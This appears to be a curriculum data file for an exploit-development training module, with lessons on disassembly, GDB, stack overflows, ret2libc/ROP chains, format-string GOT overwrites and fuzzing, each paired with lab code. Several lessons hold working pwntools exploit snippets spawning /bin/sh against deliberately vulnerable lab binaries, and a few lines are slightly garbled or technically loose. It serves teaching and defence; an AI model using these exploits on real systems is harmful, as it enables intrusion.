import type { Module } from "../curriculum";

export const module39: Module = {
  id: "module-39",
  slug: "39-reverse-engineering-exploit",
  title: "Reverse Engineering & Exploit Development",
  description:
    "Reading binaries without reading binaries: disassembly ground rules, stack/Linux ELF exploitation, ret2libc, ROP, and a clean lab drill to earn the exploit badge.",
  language: "MW",
  lessons: [
    {
      id: 1,
      slug: "01-disassembly-ida-ghidra",
      title: "Disassembly: objdump, Ghidra, IDA",
      level: "intermediate",
      tag: "lab",
      duration: "45 min",
      description:
        "Turning binaries into readable code: file type, sections, mnemonics, decompilers, and when Ghidra beats IDA.",
      content: `
# Disassembly: objdump, Ghidra, IDA

## Understand the binary mouth

\`\`\`
file ./app ; readelf -h ./app; readelf -s ./app | head
nm ./app | less           # symbol table
\`\`\`
ELF (Linux) / PE (Windows). Sections: .text (code), .data/.rodata (data), .bss (uninit). Symbols = function names (they make life easy; stripping removes them, and RE becomes slower).

## objdump basics

\`\`\`
objdump -d ./app | head -50          # disassembly of .text
objdump -M intel -d ./app | grep main -A 20
objdump -t ./app | grep main         # find main's address
\`\`\`

## Key mnemonics on x86-64

\`\`\`
mov rax, 7        # load immediate
lea rdi, [rip+foo] # effective address (string table)
call 0x4012d0     # function call
test edi, edi     # flags for / jnz (if (a==0))
cmp rax, 0x2a     # compare
jnz/jz/jg         # jumps
push rbp ; mov rbp, rsp  # frame prologue
\`\`\`

## Ghidra vs IDA

- **IDA Pro** (paid) — the king of decompilers; auto-structure
- **Ghidra** (free, NSA) — decompiles, code samples, scripting in Python
- For learning: Ghidra wins (free + great)
- For Windows RE: x64dbg (debugger) pairs with Ghidra

## The beginner loop

\`\`\`
1. file + readelf (what is it?)
2. strings (what does it echo/check?) — fast win
3. objdump -d main (see the flow)
4. Ghidra import + auto-analysis + decompile main
5. spot the check (cmp/jne) and its constant
\`\`\`

## Caution zone

- RET the security concern: this is *your* learning lab. Analyzing malware in a VM with samples from controlled CTF/labs is the professional path; never random email attachments.
> RE is a magnifying glass, not a dark spell. Strings + objdump + Ghidra solve 80% of the 'what does this binary do' question.
`,
      defaultCode: `# find main and read it
file ./lab_bin
strings ./lab_bin | grep -i password
objdump -M intel -d ./lab_bin | grep -A 30 '<main>:'
# or in ghidra: decompile main; spot cmp/jne to the flag string`,
      solution: `strings ./lab_bin | grep -i password
objdump -M intel -d ./lab_bin | grep -A 30 '<main>:'`,
      hint: "file→strings→objdump→Ghidra. The cmp/jne to a constant is the classic 'if check'.",
      challenge: `**Home Lab — Crack the Check:**
1. Write a tiny C program in your lab: reads a password, prints OK/fail.
2. Compile it; use file, strings, objdump to find the check.
3. Find the password constant in strings/disassembly (or crack the logic).
4. Now strip it (-s), redo — what did you lose? (symbols).
5. Write the 4-step RE loop as your cheat-sheet.`,
    },
    {
      id: 2,
      slug: "02-gdb-debugging",
      title: "Debugging with GDB: Breakpoints, Registers, Assembly",
      level: "intermediate",
      tag: "lab",
      duration: "50 min",
      description:
        "GDB under the hood: disassembling on the fly, setting breakpoints at addresses, and stepping through the exact instruction that checks your input.",
      content: `
# Debugging with GDB: Breakpoints, Registers, Assembly

## GDB quickstart

\`\`\`
gdb ./lab_bin
set disassembly-flavor intel
info registers
break main                # or break *0x401160 (address)
run
stepi / nexti             # instruction stepping
x/20i $rip               # disassemble from current pc
x/s $rax                 # show string at register
\`\`\`

## Reading the check live

\`\`\`
(gdb) break *main+45
(gdb) run
(gdb) x/s $rdi            # the string it's comparing
(gdb) x/3i $rip          # see the cmp/jne
(gdb) set $rax=0         # FLIP the comparison (lab!)
(gdb) continue
\`\`\`
This is 'patching at runtime' — the attacker trick of skipping a conditional.

## Registers of interest (x86-64)

- RIP = current instruction pointer (you care about this in exploits)
- RBP/RSP = stack frame (also critical for stack overflow)
- RDI/RSI/RDX = first 3 args (SysV calling conv)
- RAX = return value

## Debugger for future exploits

- You'll set breakpoints at \`ret\`/\`call\` to hijack or observe control flow
- You'll 'patch' return addresses in your brain before actually writing an overflow

## gdb + pwndbg (the RE workhorse)

\`\`\`
# install pwndbg ~/.gdbinit:
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
# then: nice stack/registers visualization + better disasm
\`\`\`

## When you get stuck

- \`info proc mappings\` — stack/heap/libc addresses (needed for ret2libc later)
- \`bt\` backtrace when in a crash
- Compare with the Ghidra decompile to align memory addresses with source
> GDB is the microscope of RE. The day you can flip a \`jnz\` and watch the app behave differently, you're no longer a beginner.
`,
      defaultCode: `gdb ./lab_bin
set disassembly-flavor intel
break *main+45
run
x/s $rdi
x/3i $rip
set $rax=1
continue`,
      solution: `gdb ./lab_bin
set disassembly-flavor intel
break *main+45
run
x/s $rdi
x/3i $rip
set $rax=1
continue`,
      hint: "break at the compare, read the arg, flip the flag register/patch the jump in-lab.",
      challenge: `**Home Lab — Live Patch a Check:**
1. Reuse/compile the password-check program.
2. Find main+offset of the cmp in GDB (disassembly).
3. Break there, run with wrong password, x/s the compared string.
4. Patch the result (set $rax=1) → program prints OK. Prove the bypass.
5. Write a 3-line note on WHY the code allowed this and how to write it safely.`,
    },
    {
      id: 3,
      slug: "03-stack-overflow-shellcode",
      title: "Stack Exploitation: Overflow to Shellcode",
      level: "advanced",
      tag: "lab",
      duration: "60 min",
      description:
        "The real deal: buffer overflows on x86-64, ASLR/NX/CANARY, and why 'classic shellcode' now needs new friends (ret2libc/ROP).",
      content: `
# Stack Exploitation: Overflow to Shellcode

## The old story (x86, no mitigations)

\`\`\`
char buf[16]; gets(buf);   # no bounds
 -> write 16+8 (saved rbp) + 8 (ret) = 32 -> then smash RET with shellcode addr
\x90*... shellcode ... addr_of_buf   (ret slides into the NOP sled)
\`\`\`
That was 2005-era. The world got mitigations.

## The mitigation quartet

| Mitigation | Blocks | Bypass |
|-----------|--------|--------|
| **ASLR** | predictable addresses | info leak / brute force |
| **NX (DEP, W^X)** | shellcode on stack | ret2libc |
| **CANARY** | overwrite detection | leak the canary / other bugs |
| **PIE (RELRO)** | unknown base | leaks or one-gadget |

## Modern basics (amd64)

- Stack protector (canary) on by default in GCC: \`-fstack-protector\`
- NX on by default: executing stack = segfault
- ASLR ON: libc/stack addresses random per run
\`\`\`
# compile targets (lab):
gcc -m32 -no-pie -fno-stack-protector -z execstack -o vuln vuln.c   (classic NOP-sled target)
gcc -no-pie -fno-stack-protector -o vuln2 vuln.c                    (NX on -> ret2libc)
\`\`\`

## The workflows

**Classic (execstack)**: find offset (cyclic), fill to ret, put address of buffer/NOP sled → jump → shell.

**Ret2libc (NX only)**: overflow ret area with \`system("bin/sh")\` chain — no shellcode needed:
\`\`\`
ret -> system@libc ; ret ; "sh\` crude
\`\`\`
ASLR blocks exact libc addresses unless you leak them (printf of a pointer is the classic leak).

**Full modern**: leak canary + leak libc base → chain ROP → win. Now we're pros.

## Explains the craft

Use pwntools (Python) for byte-precise payloads:
\`\`\`
from pwn import *
p = process('./vuln')
p.sendline(cyclic(200)); p.wait()
core = p.corefile                     # find offset
\`\`\`

## Ethics ready

This is exploit development ON YOUR OWN LAB BOXES, with pwn.college/CTF binaries — the discipline that becomes defensive knowledge (you must know the attack to tune the DEFENSE — see M36/M39 chain).
> The overflow is not dead; it's armored. Ret2libc/ROP are the ways the modern attacker undoes NX+ASLR. Practicing exploit dev on CTFs is how you earn your blue-belt in defense.
`,
      defaultCode: `# classic no-mitigation smashing (lab)
gcc -m32 -no-pie -fno-stack-protector -z execstack -o vuln vuln.c
gdb ./vuln                        # find buffer offset with cyclic
(gdb) pattern create 200
# run with pattern -> note eip crash offset
# craft: "A"*offset + p32(buf_addr + NOPs) + shellcode`,
      solution: `gcc -m32 -no-pie -fno-stack-protector -z execstack -o vuln vuln.c
gdb ./vuln
(gdb) pattern create 200`,
      hint: "Get the offset (cyclic), then control RIP; mitigations force ret2libc/ROP.",
      challenge: `**Home Lab — First Shell (Classic, 32-bit):**
1. Compile the classic vuln (\`-m32 -fno-stack-protector -z execstack -no-pie\`).
2. Find the offset via cyclic/pattern in gdb.
3. Put a NOP sled + exec /bin/sh shellcode + buffer address → spawn a shell.
4. Now REPLACE with NX on (\`-z noexecstack\`) — see the same input fail.
5. Write the 5-line story of why mitigations make you smarter.`,
    },
    {
      id: 4,
      slug: "04-ret2libc-rop",
      title: "Ret2libc, ROP & Chains",
      level: "advanced",
      tag: "lab",
      duration: "60 min",
      description:
        "Without shellcode on the stack you still have GOT and libc: return-to-libc, ROP gadgets, chain-building, and one-gadgets.",
      content: `
# Ret2libc, ROP & Chains

## Ret2libc concept

NX kills shellcode, not the attack. The exploit just returns to functions *already in memory*:

\`\`\`
overflow ret -> system() address
               next [ret] -> return address
               next [rdi = bin_sh pointer]
\`\`\`
\`system('/bin/sh')\` — no shellcode written at all. Requirement: know system + /bin/sh offsets (libc leak).

## Finding values

\`\`\`
# in lab, without ASLR running first:
ldd ./vuln                       # libc location
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
# find /bin/sh string in libc:
strings -tx /lib/.../libc.so.6 | grep /bin/sh
# with ASLR: leak libc base via printf/GOT, then recompute
\`\`\`

## ROP: the fallback that never needs a shlib shellcode

If you can't call system (gadget constraints), chain tiny 'gadgets' (pop-ret, mov, syscall):
\`\`\`
ret gadget: pop rdi ; ret   +  /bin/sh addr   +  system
or purely:  syscall; ret  +  execve regs (Linux)
\`\`\`
Tooling: ROPgadget / ropper generate the chain for you.

## One-gadget (the shortcut for ctx)

- execve("/bin/sh",...)-ready gadget addresses in libc — single jump if constraints met
- \`one_gadget\` tool checks constraints

## The chain builders (pwntools)

\`\`\`
from pwn import *
context.binary = './vuln'
rop = ROP(context.binary)
rop.call('system', [b'/bin/sh'])
print(rop.dump())
p = process('./vuln')
p.sendline(b'A'*offset + rop.chain())
p.interactive()
\`\`\`

## The 'no libc' miracle: ret2dlresolve / GOT overwrite

- Overwrite GOT entry (of puts/free) to another function — modern 'ret2plt'
- Classic advanced topics; learn ret2libc + rop first.

## Mitigations (so the blue side wins)

- **RELRO**: prevent GOT overwrites (FULL RELRO)
- **PIE**: unknown base => leaks needed
- **Canary**: still random
- **ASLR**: entropy that must be beaten per exploit
> Ret2libc is the reason ASLR + NX exist together, and together they're still not enough vs someone who can write a chain. Exploit dev = reading memory with your hands.
`,
      defaultCode: `# rop chain with pwntools (lab)
from pwn import *
context.binary = './vuln2'
rop = ROP(context.binary)
rop.call('system', [b'/bin/sh'])
print('chain:', rop.chain().hex())
p = process('./vuln2')
p.sendline(b'A' * 16 + rop.chain())
p.interactive()`,
      solution: `from pwn import *
context.binary = './vuln2'
rop = ROP(context.binary)
rop.call('system', [b'/bin/sh'])
p = process('./vuln2')
p.sendline(b'A' * 16 + rop.chain())
p.interactive()`,
      hint: "Leak libc, chain pop-rdi+libc+bin_sh, ret-to-system. RELRO/ASLR/canary slow, not stop.",
      challenge: `**Home Lab — Ret2libc Win:**
1. Use the NX-only vuln (no execstack, no pie).
2. Disable ASLR for the lab (setarch -R), find system + /bin/sh offsets.
3. Build the ret2libc chain and spawn /bin/sh.
4. RE-ENABLE ASLR; attempt without a leak — what breaks?
5. Write 3 sentences on what FULL RELRO + PIE would do to this exploit.`,
    },
    {
      id: 5,
      slug: "05-format-string-arbitrary-read",
      title: "Format String Attacks: Arbitrary Read/Write",
      level: "advanced",
      tag: "lab",
      duration: "45 min",
      description:
        "The OTHER classic: printf bugs that read AND write memory anywhere — turning them into leaks and GOT overwrites.",
      content: `
# Format String Attacks: Arbitrary Read/Write

## The bug

\`\`\`
printf(user_input);      # WRONG — user controls the FORMAT string
printf("%s", user_input) # correct
\`\`\`
With the format string you can walk the stack, read args, and write.

## Reading with %n-family

- \`%p\`, \`%x\` — read stack words
- \`%10$p\` — read the 10th argument
- \`%s\` — READ MEMORY AT an address you supply
- \`%n\`, \`%hn\`, \`%hhn\` — WRITE number-of-printed-chars to an address

## Arbitrary read recipe

\`\`\`
payload = p32(target_addr) + "%7$s"   # print the string at target_addr
# leaks: any pointer (a GOT entry), is an informational goldmine
\`\`\`

## Arbitrary write recipe (GOT overwrite)

\`\`\`
step 1: know an address you can point at (e.g., a GOT entry for exit() )
step 2: two %hn / four %hhn writes set the bytes of a function pointer
step 3: point the pointer to your function / ret2libc chain
\`\`\`
Partial writes, width modifiers, and ordering get twitchy — pwntools \`fmtstr_payload\` automates the grind in labs.

## Why it still matters

- Found in legacy C codebases constantly ('aha!' pattern in bug bounties)
- Teaches *address arithmetic* and *pointer control* — ROP's foundation
- Interplay: leak stack addresses → defeat ASLR → then ret2libc

## Defensive takeaway (blue)

- Never pass user data to printf(format) — the single-line fix
- Compiler \`__attribute__((format))\` / -Wformat=2 warns
> A format bug is sabotage in a string: read anything, write anything. Fixing them = validating that format is never attacker-controlled.
`,
      defaultCode: `# pwntools autogeneration (lab)
from pwn import *
context.binary = './fmt'
payload = fmtstr_payload(7, { target_got: system_addr })   # conceptual
p = process('./fmt')
p.sendline(payload)
p.interactive()`,
      solution: `from pwn import *
context.binary = './fmt'
payload = fmtstr_payload(7, { target_got: system_addr })
p = process('./fmt')
p.sendline(payload)
p.interactive()`,
      hint: "printf user data = read/write anywhere. %n writes; %s reads; %N$p walks args.",
      challenge: `**Home Lab — Prove the Leak:**
1. Write/compile a tiny C prog using printf(user_input).
2. Leak stack addresses with %p / %8$p.
3. Find and printf a secret string located in the program (arbitrary read with %s).
4. Try a %n write to a data address and observe corruption (in-lab only!).
5. Write the one-line fix + the compiler flag you'd recommend.`,
    },
    {
      id: 6,
      slug: "06-fuzzing-cve",
      title: "Fuzzing, CVEs & Reading Advisories",
      level: "intermediate",
      tag: "lab",
      duration: "45 min",
      description:
        "Happy path ends: instead of grokking every bug by hand, let the machine find them. AFL++/libFuzzer, triage, CVE literacy, ZDI-style advisory reading.",
      content: `
# Fuzzing, CVEs & Reading Advisories

## Fuzzing = machine-driven bug-hunt

\`\`\`
Input far beyond valid -> feed the target millions of times
-> any crash/file/assert = a candidate bug
\`\`\`
Types: dumb (random), grammar-aware, coverage-guided (the modern standard).

## The coverage-guided loop (AFL++ / libFuzzer)

\`\`\`
afl-fuzz -i in/ -o out/ ./target @@
# it feeds corpus, adds interesting samples, watches coverage, reports crashes
# read out/crashes/ — a crashing file = your proof
\`\`\`

## Triage like a pro

- Reproduce the crash (run the crashing input again)
- Note the exact fault: SEGV (offset?), heap corruption, assert
- Classify: use-after-free, overflow, integer, format...
- Minimize the input (afl-tmin / delta) → a small, clean repro
- Decide impact without trembling: can you get R/W/E from it?

## CVE literacy

\`\`\`
CVE-2026-12345   (year + serial)
- The 'CVSS score' you must sanity-check (is it really 'critical'?)
- 'Affected versions' -> patch line -> your duty: update or mitigate
- KEV catalog (CISA): actively-exploited = PAUSE everything and patch
\`\`\`

## Reading advisories closely

- The advisory tells you: affected product/ver, type (RCE/XSS/...), workaround, CVE
- Red-team reading: "this version is 2 years old → likely exploitable"
- Blue-team reading: "patch within window or put in your risk register"

## The ethics of 0days

- Discovered: disclose responsibly (vendor timeline) or to a program
- Never weaponize/harass; the '0day YouTuber' trend harms
> Fuzzing finds in an afternoon what eyeballs in a month. But every crash is just a hypothesis until triaged — impact is what makes it a CVE.
`,
      defaultCode: `# coverage-guided fuzz one-liner (lab)
mkdir -p in; echo hi > in/seed
afl-fuzz -i in -o out -- ./target @@
# after some minutes:
ls out/crashes/  # if non-empty, you have reproducing inputs
xxd out/crashes/id:* | head`,
      solution: `mkdir -p in; echo hi > in/seed
afl-fuzz -i in -o out -- ./target @@
ls out/crashes/`,
      hint: "Coverage-guided corpus→crashes; triage by reproduce→minimize→impact class; read advisories with 'what do I patch when'.",
      challenge: `**Home Lab — Fuzz & Triage:**
1. Build a tiny vulnerable parser (reads len+data; copy len bytes).
2. Fuzz it with AFL++/honggfuzz until a crash appears.
3. Reproduce + minimize the input to the smallest crash.
4. Classify the bug type + propose a fix line.
5. Now read 2 real advisories from last year: extract CVE, affected versions, your action if you'd owned it.`,
    },
  ],
};